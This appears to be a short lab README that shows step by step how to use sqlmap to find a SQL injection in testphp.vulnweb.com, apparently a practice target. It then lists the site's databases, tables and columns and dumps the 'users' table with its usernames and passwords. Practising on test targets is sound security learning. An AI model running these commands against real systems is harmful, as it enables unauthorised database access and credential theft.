The following query is to find either the given URL (The website) is vulnerable or not.

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " --dbs

Once the above querry runs prefectly and tells what vulnerability that website has  and you get the names of the Databases that Website contains.
In my case the Vulnerability is GET method

the following querry is to find the tables name of a specific Database

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} --tables  

 above query will give the names of the tables in the provided  {Database name}

Once we get the names of table we can easily access to the columns and its data

Following query will demonstrate it for example in my case i have got tables names and demonstrated on (users table) and tried to access the UNAME & PASS

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} -T users --columns


following command is used to dump the data of DATABASE (save table of database into .csv file extention)

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} --dump -T users 


THE DATA WHICH I HAVE DUMPED USING SQL INJECTION IS IN DUMP FOLDER
